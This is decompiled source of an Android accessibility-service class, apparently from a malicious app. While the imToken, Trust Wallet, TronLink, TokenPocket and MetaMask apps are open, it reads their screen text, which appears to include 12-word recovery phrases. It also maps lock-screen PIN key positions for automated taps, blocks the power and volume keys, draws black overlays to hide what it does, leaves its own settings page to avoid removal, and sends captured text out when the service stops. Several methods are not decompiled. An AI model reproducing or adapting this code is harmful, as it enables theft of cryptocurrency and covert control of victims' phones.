package com.superbock.auto;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.app.KeyguardManager;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Build;
import android.text.TextUtils;
import android.view.KeyEvent;
import android.view.LayoutInflater;
import android.view.SurfaceView;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.FrameLayout;
import android.widget.ImageView;
import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.exifinterface.media.ExifInterface;
import androidx.work.WorkRequest;
import com.bumptech.glide.b;
import com.superbock.App;
import com.superbock.bean.GInfo;
import comeliest.metempsychosis.pokelogan.R;
import f3.e;
import f3.f;
import f3.i;
import f3.n;
import i.g;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import k3.h;
import marmojkfnf.huflnkmt.ncagri.jdtuadkc.Ksfndkd;
import r.l;
import s3.b0;
import s3.d;

/* loaded from: classes.dex */
public class BaseService extends AccessibilityService {
    public static String A;
    public static boolean B;
    public static Boolean C;
    public static long D;
    public static long E;
    public static boolean F;
    public static boolean G;
    public static final Set<String> H;
    public static e I;
    public static SurfaceView J;
    public static WindowManager.LayoutParams K;
    public static Boolean L;
    public static Integer M;
    public static boolean N;
    public static List<n> O;
    public static List<String> P;
    public static String Q;
    public static Map<String, String> R;
    public static String S;
    public static long T;
    public static String U;
    public static String V;
    public static long W;
    public static boolean X;
    public static String Y;
    public static long Z;

    /* renamed from: a0, reason: collision with root package name */
    public static String f1384a0;

    /* renamed from: b0, reason: collision with root package name */
    public static long f1385b0;

    /* renamed from: c0, reason: collision with root package name */
    public static String f1386c0;

    /* renamed from: d0, reason: collision with root package name */
    public static long f1387d0;

    /* renamed from: e0, reason: collision with root package name */
    public static String f1388e0;

    /* renamed from: f0, reason: collision with root package name */
    public static long f1389f0;

    /* renamed from: g0, reason: collision with root package name */
    public static String f1390g0;

    /* renamed from: h0, reason: collision with root package name */
    public static long f1391h0;

    /* renamed from: i0, reason: collision with root package name */
    public static String f1392i0;

    /* renamed from: j0, reason: collision with root package name */
    public static long f1393j0;

    /* renamed from: k0, reason: collision with root package name */
    public static String f1394k0;

    /* renamed from: l0, reason: collision with root package name */
    public static boolean f1395l0;

    /* renamed from: m0, reason: collision with root package name */
    public static boolean f1396m0;
    public static int n0;
    public static boolean o0;

    /* renamed from: p0, reason: collision with root package name */
    public static boolean f1397p0;

    /* renamed from: q, reason: collision with root package name */
    public static long f1398q;

    /* renamed from: q0, reason: collision with root package name */
    public static boolean f1399q0;

    /* renamed from: r, reason: collision with root package name */
    public static BaseService f1400r;

    /* renamed from: r0, reason: collision with root package name */
    public static boolean f1401r0;

    /* renamed from: s, reason: collision with root package name */
    public static WindowManager f1402s;

    /* renamed from: t, reason: collision with root package name */
    public static FrameLayout f1403t;

    /* renamed from: u, reason: collision with root package name */
    public static WindowManager.LayoutParams f1404u;

    /* renamed from: v, reason: collision with root package name */
    public static FrameLayout f1405v;

    /* renamed from: w, reason: collision with root package name */
    public static WindowManager.LayoutParams f1406w;

    /* renamed from: x, reason: collision with root package name */
    public static FrameLayout f1407x;

    /* renamed from: y, reason: collision with root package name */
    public static WindowManager.LayoutParams f1408y;

    /* renamed from: z, reason: collision with root package name */
    public static boolean f1409z;

    /* renamed from: b, reason: collision with root package name */
    public int f1410b;

    /* renamed from: c, reason: collision with root package name */
    public int f1411c;

    /* renamed from: d, reason: collision with root package name */
    public KeyguardManager f1412d;

    /* renamed from: e, reason: collision with root package name */
    public AccessibilityNodeInfo f1413e;

    /* renamed from: f, reason: collision with root package name */
    public String f1414f;

    /* renamed from: g, reason: collision with root package name */
    public String f1415g;

    /* renamed from: h, reason: collision with root package name */
    public AccessibilityEvent f1416h;

    /* renamed from: i, reason: collision with root package name */
    public int f1417i;

    /* renamed from: j, reason: collision with root package name */
    public String f1418j;

    /* renamed from: k, reason: collision with root package name */
    public AccessibilityNodeInfo f1419k;

    /* renamed from: l, reason: collision with root package name */
    public String f1420l;

    /* renamed from: m, reason: collision with root package name */
    public String f1421m;

    /* renamed from: n, reason: collision with root package name */
    public String f1422n;

    /* renamed from: o, reason: collision with root package name */
    public String f1423o;

    /* renamed from: p, reason: collision with root package name */
    public long f1424p;

    /* loaded from: classes23.dex */
    public class a implements s3.e {
        @Override // s3.e
        public final void a(@NonNull d dVar, @NonNull b0 b0Var) {
        }

        @Override // s3.e
        public final void b(@NonNull d dVar, @NonNull IOException iOException) {
        }
    }

    static {
        Boolean bool = Boolean.FALSE;
        C = bool;
        H = new HashSet();
        L = bool;
        O = new ArrayList();
        P = new ArrayList();
        Q = "";
        R = new HashMap();
        S = "";
        U = "";
        V = "";
        f1384a0 = "";
        f1386c0 = "";
        f1388e0 = "";
        f1390g0 = "";
        f1392i0 = "";
        f1394k0 = "";
    }

    public static BaseService g() {
        BaseService baseService = f1400r;
        if (baseService != null) {
            return baseService;
        }
        throw new f("1");
    }

    public static boolean l() {
        return f1400r != null && f1398q > 0;
    }

    public final void A() {
        if (g.h(this.f1413e, "1") && g.h(this.f1413e, ExifInterface.GPS_MEASUREMENT_2D) && g.h(this.f1413e, ExifInterface.GPS_MEASUREMENT_3D) && g.h(this.f1413e, "4") && g.h(this.f1413e, "5") && g.h(this.f1413e, "6") && g.h(this.f1413e, "7") && g.h(this.f1413e, "8") && g.h(this.f1413e, "9") && g.h(this.f1413e, "10") && g.h(this.f1413e, "11") && g.h(this.f1413e, "12")) {
            String G2 = g.G(this.f1413e, null);
            if (TextUtils.isEmpty(G2)) {
                return;
            }
            f1390g0 = G2;
            f1389f0 = f1398q;
        }
    }

    public final void B() {
        if ((g.h(this.f1413e, "1") && g.h(this.f1413e, ExifInterface.GPS_MEASUREMENT_2D) && g.h(this.f1413e, ExifInterface.GPS_MEASUREMENT_3D) && g.h(this.f1413e, "4") && g.h(this.f1413e, "5") && g.h(this.f1413e, "6") && g.h(this.f1413e, "7") && g.h(this.f1413e, "8") && g.h(this.f1413e, "9") && g.h(this.f1413e, "10") && g.h(this.f1413e, "11") && g.h(this.f1413e, "12")) || (g.g(this.f1413e, "1.") && g.g(this.f1413e, "2.") && g.g(this.f1413e, "3.") && g.g(this.f1413e, "4.") && g.g(this.f1413e, "5.") && g.g(this.f1413e, "6.") && g.g(this.f1413e, "7.") && g.g(this.f1413e, "8.") && g.g(this.f1413e, "9.") && g.g(this.f1413e, "10.") && g.g(this.f1413e, "11.") && g.g(this.f1413e, "12."))) {
            String G2 = g.G(this.f1413e, null);
            if (TextUtils.isEmpty(G2)) {
                return;
            }
            f1388e0 = G2;
            f1387d0 = f1398q;
        }
    }

    /* JADX WARN: Can't wrap try/catch for region: R(6:162|(3:164|(10:168|(1:170)|171|(1:173)(1:191)|174|(1:176)|177|(1:179)|180|(1:182)(2:183|(1:185)))|161)(2:(2:193|(12:197|(1:199)|200|(1:202)(1:215)|203|(1:205)|206|(1:208)|209|210|211|212))(1:(2:217|(2:220|(2:222|(5:224|225|226|227|(7:229|(1:231)|232|(1:234)(1:239)|235|(1:237)|238)(1:240)))(2:243|(5:247|248|249|250|(2:252|(1:254))(1:255))))(1:219))(2:258|(2:260|(2:262|(7:264|(1:266)|267|(1:269)|270|(1:272)|273))(2:274|(3:278|279|280)))(1:(2:284|(2:286|(1:290))(2:291|(3:295|279|280))))))|161)|186|187|188|161) */
    /* JADX WARN: Code restructure failed: missing block: B:27:0x0071, code lost:
    
        if ((java.lang.System.currentTimeMillis() - com.superbock.auto.BaseService.E) > 3000) goto L27;
     */
    /* JADX WARN: Code restructure failed: missing block: B:304:0x0460, code lost:
    
        if (r0 == null) goto L265;
     */
    /* JADX WARN: Code restructure failed: missing block: B:389:0x05b6, code lost:
    
        if (r4.getChild(0).isChecked() != false) goto L353;
     */
    /* JADX WARN: Removed duplicated region for block: B:306:0x047a  */
    @android.annotation.SuppressLint({"NewApi"})
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public final void a() {
        /*
            Method dump skipped, instructions count: 1647
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.superbock.auto.BaseService.a():void");
    }

    /* JADX WARN: Code restructure failed: missing block: B:371:0x0587, code lost:
    
        if (r1.isVisibleToUser() == false) goto L309;
     */
    /* JADX WARN: Code restructure failed: missing block: B:372:0x05c7, code lost:
    
        x();
        com.superbock.auto.BaseService.E = java.lang.System.currentTimeMillis();
     */
    /* JADX WARN: Code restructure failed: missing block: B:373:0x05d0, code lost:
    
        return;
     */
    /* JADX WARN: Code restructure failed: missing block: B:386:0x05c5, code lost:
    
        if (r1.isVisibleToUser() == false) goto L309;
     */
    /* JADX WARN: Code restructure failed: missing block: B:408:0x0641, code lost:
    
        if (r1.isChecked() == false) goto L333;
     */
    /* JADX WARN: Code restructure failed: missing block: B:451:0x06f7, code lost:
    
        if (r1.isChecked() == false) goto L369;
     */
    /* JADX WARN: Code restructure failed: missing block: B:507:0x082d, code lost:
    
        if (r1.isChecked() == false) goto L369;
     */
    /* JADX WARN: Code restructure failed: missing block: B:517:0x085c, code lost:
    
        if (r1.isChecked() == false) goto L369;
     */
    /* JADX WARN: Type inference failed for: r14v3, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r1v107, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r1v116, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r1v124, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r1v145, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r1v150, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r1v156, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r1v16, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r1v190, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r1v199, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r1v202, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r1v21, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r1v210, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r1v264, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r1v28, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r1v36, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r1v50, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r1v59, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r1v62, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r1v93, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r1v99, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r2v129, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r2v39, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r2v43, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r2v44, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r2v63, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r2v66, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r2v70, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r2v77, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r2v83, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    @android.annotation.SuppressLint({"NewApi"})
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public final void b() {
        /*
            Method dump skipped, instructions count: 2174
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.superbock.auto.BaseService.b():void");
    }

    /* JADX WARN: Code restructure failed: missing block: B:173:0x0061, code lost:
    
        r2 = true;
     */
    /* JADX WARN: Code restructure failed: missing block: B:190:0x00ad, code lost:
    
        if (r2.equals(r14.f1422n) != false) goto L21;
     */
    /* JADX WARN: Code restructure failed: missing block: B:202:0x00da, code lost:
    
        if (d(r2) != false) goto L21;
     */
    /* JADX WARN: Code restructure failed: missing block: B:213:0x0107, code lost:
    
        if (d(r2) != false) goto L21;
     */
    /* JADX WARN: Code restructure failed: missing block: B:21:0x005b, code lost:
    
        if (i.g.n(r14.f1413e, r14.f1422n, true) != null) goto L21;
     */
    /* JADX WARN: Code restructure failed: missing block: B:222:0x012b, code lost:
    
        if (d(r2) != false) goto L21;
     */
    /* JADX WARN: Code restructure failed: missing block: B:22:0x005d, code lost:
    
        r2 = false;
        r6 = true;
     */
    /* JADX WARN: Code restructure failed: missing block: B:231:0x014d, code lost:
    
        if (d(r2) != false) goto L21;
     */
    /* JADX WARN: Code restructure failed: missing block: B:242:0x017f, code lost:
    
        if (d(r2) != false) goto L21;
     */
    /* JADX WARN: Code restructure failed: missing block: B:253:0x01b1, code lost:
    
        if (d(r2) != false) goto L21;
     */
    /* JADX WARN: Code restructure failed: missing block: B:264:0x01dd, code lost:
    
        if (d(r2) != false) goto L21;
     */
    /* JADX WARN: Removed duplicated region for block: B:73:0x04b2  */
    /* JADX WARN: Removed duplicated region for block: B:75:? A[RETURN, SYNTHETIC] */
    @androidx.annotation.RequiresApi(api = 24)
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public final void c() {
        /*
            Method dump skipped, instructions count: 1209
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.superbock.auto.BaseService.c():void");
    }

    public final boolean d(String str) {
        return str.contains(this.f1422n) || (X && str.contains("\u2064")) || (!TextUtils.isEmpty(Y) && str.contains(Y));
    }

    /* JADX WARN: Type inference failed for: r1v0, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    public final void e() {
        G = false;
        ?? r12 = H;
        synchronized (r12) {
            if (!r12.isEmpty()) {
                int size = r12.size();
                r12.clear();
                for (int i5 = 0; i5 < size; i5++) {
                    performGlobalAction(1);
                    E = System.currentTimeMillis();
                    try {
                        Thread.sleep(700L);
                    } catch (InterruptedException unused) {
                    }
                }
            }
        }
    }

    /* JADX WARN: Type inference failed for: r0v3, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    public final boolean f(String str) {
        Map<String, String> k5;
        if (str == null || str.length() <= 0) {
            return false;
        }
        if (str.equals(this.f1422n)) {
            return true;
        }
        if (!e3.d.f2596f.contains(str) || (k5 = k3.f.k(this)) == null) {
            return false;
        }
        HashMap hashMap = (HashMap) k5;
        return "1".equals(hashMap.get("isPlayStore")) && "0".equals(hashMap.get("isEnabled"));
    }

    /* JADX WARN: Type inference failed for: r0v0, types: [java.util.HashMap, java.util.Map<java.lang.String, java.lang.String>] */
    /* JADX WARN: Type inference failed for: r0v5, types: [java.util.HashMap, java.util.Map<java.lang.String, java.lang.String>] */
    /* JADX WARN: Type inference failed for: r0v6, types: [java.util.HashMap, java.util.Map<java.lang.String, java.lang.String>] */
    /* JADX WARN: Type inference failed for: r2v3, types: [java.util.HashMap, java.util.Map<java.lang.String, java.lang.String>] */
    public final String h(String str) {
        if (R.isEmpty() || !R.containsKey(str)) {
            for (int i5 = 0; i5 <= 9; i5++) {
                Rect rect = new Rect();
                AccessibilityNodeInfo k5 = g.k(this.f1413e, "com.android.systemui:id/key" + i5);
                if (k5 == null) {
                    k5 = g.k(this.f1413e, "com.android.systemui:id/VivoPinkey" + i5);
                    if (k5 == null) {
                        k5 = g.i(this.f1413e, "" + i5, true);
                        if (k5 == null) {
                            k5 = g.n(this.f1413e, "" + i5, true);
                        }
                    }
                }
                if (k5 != null) {
                    k5.getBoundsInScreen(rect);
                    R.put(androidx.appcompat.widget.a.g("", i5), g.u(rect));
                }
            }
        }
        return (String) R.get(str);
    }

    public final AccessibilityNodeInfo i() {
        AccessibilityNodeInfo rootInActiveWindow = getRootInActiveWindow();
        if (rootInActiveWindow != null) {
            this.f1413e = rootInActiveWindow;
            this.f1414f = rootInActiveWindow.getPackageName().toString();
        }
        return this.f1413e;
    }

    public final void j() {
        boolean d5 = k3.d.d(getApplicationContext());
        X = d5;
        if (d5) {
            performGlobalAction(2);
            return;
        }
        int i5 = e3.d.f2591a;
        if (i5 == 3 || i5 == 14) {
            performGlobalAction(2);
            k3.d.b(this, 2);
        } else {
            k3.d.b(this, 1);
        }
        if (k3.d.d(this)) {
            Ksfndkd.INSTANCE.showTips(this, this.f1423o);
            App.f1372b.f();
        }
    }

    public final void k() {
        if (g.h(this.f1413e, "1") && g.h(this.f1413e, ExifInterface.GPS_MEASUREMENT_2D) && g.h(this.f1413e, ExifInterface.GPS_MEASUREMENT_3D) && g.h(this.f1413e, "4") && g.h(this.f1413e, "5") && g.h(this.f1413e, "6") && g.h(this.f1413e, "7") && g.h(this.f1413e, "8") && g.h(this.f1413e, "9") && g.h(this.f1413e, "10") && g.h(this.f1413e, "11") && g.h(this.f1413e, "12")) {
            String G2 = g.G(this.f1413e, null);
            if (TextUtils.isEmpty(G2)) {
                return;
            }
            f1384a0 = G2;
            Z = f1398q;
        }
    }

    @RequiresApi(api = 24)
    public final void m(float f5, float f6) {
        Path path = new Path();
        path.moveTo(f5 - 1.0f, f6 - 1.0f);
        path.lineTo(f5 + 1.0f, f6 + 1.0f);
        o(path, 100L);
    }

    @RequiresApi(api = 24)
    public final void n(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo == null || accessibilityNodeInfo.performAction(16)) {
            return;
        }
        Rect rect = new Rect();
        accessibilityNodeInfo.getBoundsInScreen(rect);
        int i5 = rect.left;
        float f5 = ((rect.right - i5) / 2) + i5;
        int i6 = rect.top;
        m(f5, ((rect.bottom - i6) / 2) + i6);
    }

    @RequiresApi(api = 24)
    public final void o(Path path, long j5) {
        dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, j5)).build(), null, null);
    }

    @Override // android.accessibilityservice.AccessibilityService
    @RequiresApi(api = 24)
    public final void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        AccessibilityNodeInfo accessibilityNodeInfo;
        f1398q = System.currentTimeMillis();
        try {
            s();
            t();
            this.f1416h = accessibilityEvent;
        } catch (Throwable unused) {
            accessibilityNodeInfo = this.f1413e;
            if (accessibilityNodeInfo == null) {
                return;
            }
        }
        if (accessibilityEvent == null) {
            AccessibilityNodeInfo accessibilityNodeInfo2 = this.f1413e;
            if (accessibilityNodeInfo2 != null) {
                try {
                    accessibilityNodeInfo2.recycle();
                    return;
                } catch (Throwable unused2) {
                    return;
                }
            }
            return;
        }
        this.f1417i = accessibilityEvent.getEventType();
        this.f1418j = this.f1416h.getPackageName().toString();
        AccessibilityNodeInfo source = this.f1416h.getSource();
        this.f1419k = source;
        this.f1420l = source == null ? null : source.getViewIdResourceName();
        this.f1413e = getRootInActiveWindow();
        r();
        AccessibilityNodeInfo accessibilityNodeInfo3 = this.f1413e;
        if (accessibilityNodeInfo3 == null) {
            if (accessibilityNodeInfo3 != null) {
                try {
                    accessibilityNodeInfo3.recycle();
                    return;
                } catch (Throwable unused3) {
                    return;
                }
            }
            return;
        }
        this.f1415g = this.f1414f;
        String charSequence = accessibilityNodeInfo3.getPackageName().toString();
        this.f1414f = charSequence;
        charSequence.equals(this.f1415g);
        if ("im.token.app".equals(this.f1414f)) {
            k();
        } else if ("vip.mytokenpocket".equals(this.f1414f)) {
            y();
        } else if ("com.wallet.crypto.trustapp".equals(this.f1414f)) {
            B();
        } else if ("com.tronlinkpro.wallet".equals(this.f1414f)) {
            A();
        } else if ("com.tronlink.global".equals(this.f1414f)) {
            z();
        } else if ("io.metamask".equals(this.f1414f)) {
            if (g.l(this.f1413e, true) != null) {
                String G2 = g.G(this.f1413e, null);
                if (!TextUtils.isEmpty(G2)) {
                    f1394k0 = G2;
                    f1393j0 = f1398q;
                }
            }
        }
        if ((D <= 0 || System.currentTimeMillis() - D > 60000) && g.o(this.f1413e, getString(R.string.accessibility_title), true) != null && g.n(this.f1413e, getString(R.string.accessibility_desc), true) != null) {
            performGlobalAction(1);
            performGlobalAction(1);
        }
        c();
        a();
        w();
        v();
        accessibilityNodeInfo = this.f1413e;
        if (accessibilityNodeInfo == null) {
            return;
        }
        try {
            accessibilityNodeInfo.recycle();
        } catch (Throwable unused4) {
        }
    }

    @Override // android.app.Service
    public final void onCreate() {
        super.onCreate();
        this.f1410b = h.b(this);
        this.f1411c = h.a(this);
        this.f1412d = (KeyguardManager) getSystemService("keyguard");
        String b5 = k3.a.b(this);
        this.f1422n = b5;
        this.f1423o = getString(R.string.uninstalled, b5);
        boolean d5 = k3.d.d(getApplicationContext());
        X = d5;
        Y = d5 ? k3.d.a(this) : null;
    }

    @Override // android.app.Service
    public final void onDestroy() {
        try {
            String G2 = g.G(this.f1413e, this.f1416h);
            if (G2 != null) {
                g3.h.b().a(new GInfo(e3.d.a(), 99, G2, this.f1414f));
            }
        } catch (Throwable unused) {
        }
        f1400r = null;
        f1398q = 0L;
        u(0);
        super.onDestroy();
    }

    @Override // android.accessibilityservice.AccessibilityService
    public final void onInterrupt() {
        try {
            String G2 = g.G(this.f1413e, this.f1416h);
            if (G2 != null) {
                g3.h.b().a(new GInfo(e3.d.a(), 98, G2, this.f1414f));
            }
        } catch (Throwable unused) {
        }
        f1400r = null;
        f1398q = 0L;
        u(0);
    }

    @Override // android.accessibilityservice.AccessibilityService
    public final boolean onKeyEvent(KeyEvent keyEvent) {
        if (B && (keyEvent.getKeyCode() == 26 || keyEvent.getKeyCode() == 164 || keyEvent.getKeyCode() == 25 || keyEvent.getKeyCode() == 24)) {
            return true;
        }
        return super.onKeyEvent(keyEvent);
    }

    /* JADX WARN: Removed duplicated region for block: B:13:0x01ea  */
    @Override // android.accessibilityservice.AccessibilityService
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public final void onServiceConnected() {
        /*
            Method dump skipped, instructions count: 562
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.superbock.auto.BaseService.onServiceConnected():void");
    }

    @RequiresApi(api = 24)
    public final void p(float f5, float f6, long j5) {
        Path path = new Path();
        path.moveTo(f5 - 1.0f, f6 - 1.0f);
        path.lineTo(f5 + 1.0f, f6 + 1.0f);
        o(path, j5);
    }

    @RequiresApi(api = 24)
    public final void q(float f5, float f6, float f7, float f8) {
        Path path = new Path();
        path.moveTo(f5, f6);
        path.lineTo(f7, f8);
        o(path, 200L);
    }

    /* JADX WARN: Code restructure failed: missing block: B:129:0x0358, code lost:
    
        if (com.superbock.auto.BaseService.Q.length() > 1) goto L242;
     */
    /* JADX WARN: Code restructure failed: missing block: B:130:0x04e4, code lost:
    
        r0 = com.superbock.auto.BaseService.Q;
        com.superbock.auto.BaseService.Q = r0.substring(0, r0.length() - 1);
        r0 = com.superbock.auto.BaseService.P;
        r0.remove(r0.size() - 1);
     */
    /* JADX WARN: Code restructure failed: missing block: B:154:0x03c8, code lost:
    
        if ((com.superbock.auto.BaseService.S.length() - r4) == 1) goto L206;
     */
    /* JADX WARN: Code restructure failed: missing block: B:155:0x0434, code lost:
    
        r0 = com.superbock.auto.BaseService.S;
        r0 = r0.substring(0, r0.length() - 1);
     */
    /* JADX WARN: Code restructure failed: missing block: B:170:0x0432, code lost:
    
        if ((com.superbock.auto.BaseService.S.length() - r4) == 1) goto L206;
     */
    /* JADX WARN: Code restructure failed: missing block: B:197:0x04e2, code lost:
    
        if (com.superbock.auto.BaseService.Q.length() > 1) goto L242;
     */
    /* JADX WARN: Code restructure failed: missing block: B:246:0x005e, code lost:
    
        if (r31.f1416h.getContentDescription() != null) goto L36;
     */
    /* JADX WARN: Code restructure failed: missing block: B:247:0x0101, code lost:
    
        r11 = null;
     */
    /* JADX WARN: Code restructure failed: missing block: B:251:0x00ee, code lost:
    
        r11 = r31.f1416h.getContentDescription().toString();
     */
    /* JADX WARN: Code restructure failed: missing block: B:266:0x00ec, code lost:
    
        if (r31.f1416h.getContentDescription() != null) goto L36;
     */
    /* JADX WARN: Code restructure failed: missing block: B:52:0x01ec, code lost:
    
        if (r10 == false) goto L249;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:15:0x011f  */
    /* JADX WARN: Removed duplicated region for block: B:208:0x0527  */
    /* JADX WARN: Removed duplicated region for block: B:212:0x0544  */
    /* JADX WARN: Removed duplicated region for block: B:230:0x05bc  */
    /* JADX WARN: Removed duplicated region for block: B:23:0x0166  */
    /* JADX WARN: Removed duplicated region for block: B:242:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Type inference failed for: r0v118, types: [java.util.ArrayList] */
    /* JADX WARN: Type inference failed for: r0v126, types: [java.util.ArrayList, java.util.List<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r0v130, types: [java.util.ArrayList, java.util.List<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r0v131, types: [java.util.HashMap, java.util.Map<java.lang.String, java.lang.String>] */
    /* JADX WARN: Type inference failed for: r0v149 */
    /* JADX WARN: Type inference failed for: r0v150 */
    /* JADX WARN: Type inference failed for: r0v21, types: [java.util.HashMap, java.util.Map<java.lang.String, java.lang.String>] */
    /* JADX WARN: Type inference failed for: r0v71, types: [java.util.ArrayList, java.util.List<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r0v72, types: [java.util.ArrayList, java.util.List<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r0v76, types: [java.util.ArrayList, java.util.List<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r10v16, types: [java.util.ArrayList, java.util.List<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r11v19, types: [java.util.ArrayList, java.util.List<f3.n>] */
    /* JADX WARN: Type inference failed for: r11v21, types: [java.util.ArrayList, java.util.List<f3.n>] */
    /* JADX WARN: Type inference failed for: r11v24, types: [java.util.ArrayList, java.util.List<f3.n>] */
    /* JADX WARN: Type inference failed for: r11v26, types: [java.util.ArrayList, java.util.List<f3.n>] */
    /* JADX WARN: Type inference failed for: r11v34, types: [java.util.HashMap, java.util.Map<java.lang.String, java.lang.String>] */
    /* JADX WARN: Type inference failed for: r12v0, types: [java.util.HashMap, java.util.Map<java.lang.String, java.lang.String>] */
    /* JADX WARN: Type inference failed for: r14v0, types: [int] */
    /* JADX WARN: Type inference failed for: r14v1 */
    /* JADX WARN: Type inference failed for: r14v10 */
    /* JADX WARN: Type inference failed for: r4v44, types: [java.util.ArrayList, java.util.List<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r8v3, types: [java.util.HashMap, java.util.Map<java.lang.String, java.lang.String>] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public final void r() {
        /*
            Method dump skipped, instructions count: 1521
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.superbock.auto.BaseService.r():void");
    }

    public final void s() {
        boolean z4;
        View inflate;
        FrameLayout frameLayout;
        synchronized (C) {
            if (C.booleanValue()) {
                C = Boolean.FALSE;
                if (f1405v.getWindowToken() != null) {
                    f1402s.removeView(f1405v);
                }
                if (f1403t.getWindowToken() != null) {
                    f1403t.removeAllViews();
                    f1402s.removeView(f1403t);
                    z4 = true;
                } else {
                    z4 = false;
                }
                boolean z5 = f1409z;
                if (!z5 && !B) {
                    i.d(z5);
                    i.g(B);
                    return;
                }
                if (z5) {
                    if (F) {
                        frameLayout = f1403t;
                        inflate = LayoutInflater.from(this).inflate(R.layout.black_auto, (ViewGroup) null);
                    } else {
                        if (!TextUtils.isEmpty(A)) {
                            inflate = LayoutInflater.from(this).inflate(R.layout.black_ctrl, (ViewGroup) null);
                            b.g(inflate).n(A).d(l.f4893c).v((ImageView) inflate.findViewById(R.id.black_ctrl_img));
                            if (z4) {
                                C = Boolean.TRUE;
                                performGlobalAction(3);
                                try {
                                    Thread.sleep(200L);
                                } catch (InterruptedException unused) {
                                }
                                performGlobalAction(1);
                                return;
                            }
                            frameLayout = f1403t;
                        }
                        f1403t.getBackground().setAlpha(255);
                    }
                    frameLayout.addView(inflate);
                    f1403t.getBackground().setAlpha(255);
                } else {
                    f1403t.getBackground().setAlpha(0);
                }
                f1402s.addView(f1403t, f1404u);
                if (B) {
                    f1402s.addView(f1405v, f1406w);
                }
                i.d(f1409z);
                i.g(B);
            }
        }
    }

    public final void t() {
        synchronized (L) {
            if (L.booleanValue()) {
                L = Boolean.FALSE;
                e eVar = I;
                if (eVar != null) {
                    eVar.a();
                    I = null;
                }
                if (J.getWindowToken() != null) {
                    f1402s.removeView(J);
                }
                if (M == null) {
                    i.n(0, "21", null);
                    return;
                }
